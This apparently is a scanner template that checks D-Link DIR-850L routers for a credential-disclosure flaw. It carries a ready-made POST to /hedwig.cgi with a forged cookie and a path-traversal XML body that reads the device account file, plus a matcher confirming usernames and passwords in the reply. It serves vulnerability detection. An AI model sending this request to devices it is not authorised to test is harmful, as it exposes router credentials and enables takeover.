expression: r0()
id: dlink-850l-password-leak
info:
  author: cc_ci(https://github.com/cc8ci)
  name: Dlink 850l Information Disclosure
  severity: high
  verified: true
rules:
  r0:
    expression: response.status == 200 && response.content_type.contains("xml") &&
      response.body.bcontains(b"</usrid>") && response.body.bcontains(b"</password>")
      && response.body.bcontains(b"<result>OK</result>")
    request:
      body: <?xml version="1.0" encoding="utf-8"?><postxml><module><service>../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml</service></module></postxml>
      headers:
        Content-Type: text/xml
        Cookie: uid=R8tBjwtFc8
      method: POST
      path: /hedwig.cgi
